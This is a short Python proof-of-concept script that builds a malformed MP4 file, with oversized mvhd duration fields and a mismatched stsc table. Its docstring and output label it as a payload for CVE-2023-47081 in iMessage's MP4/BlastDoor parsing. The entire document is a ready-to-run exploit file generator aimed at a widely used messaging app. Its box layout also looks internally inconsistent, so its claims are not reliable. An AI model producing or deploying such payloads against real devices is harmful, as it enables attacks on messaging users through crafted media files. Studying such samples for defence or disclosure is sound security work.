#!/usr/bin/env python3
"""CVE-2023-47081 — iMessage MP4/BlastDoor. Carrier: MP4 with a malformed
moov/mvhd (oversized duration) plus a mismatched stsc."""
import struct, sys
from pathlib import Path

def _box(t: bytes, body: bytes) -> bytes:
    return struct.pack(">I", 8 + len(body)) + t + body

def build() -> bytes:
    ftyp = _box(b"ftyp", b"isom" + b"\x00\x00\x02\x00" + b"isomiso2avc1mp41")
    mvhd = _box(b"mvhd", b"\x00" * 4 + struct.pack(">QQI", 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0x00010000))
    entry = struct.pack(">III", 1, 0xFFFF, 1)
    stsc = _box(b"stsc", struct.pack(">I", 0xFFFF) + entry)
    moov = _box(b"moov", mvhd + _box(b"trak", _box(b"mdia", _box(b"minf", _box(b"stbl", stsc)))))
    return ftyp + moov + _box(b"mdat", b"\x00" * 16)

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-47081.mp4")
    data = build(); out.write_bytes(data)
    print(f"[+] CVE-2023-47081 MP4 payload -> {out} ({len(data)} bytes)")

if __name__ == "__main__":
    main()
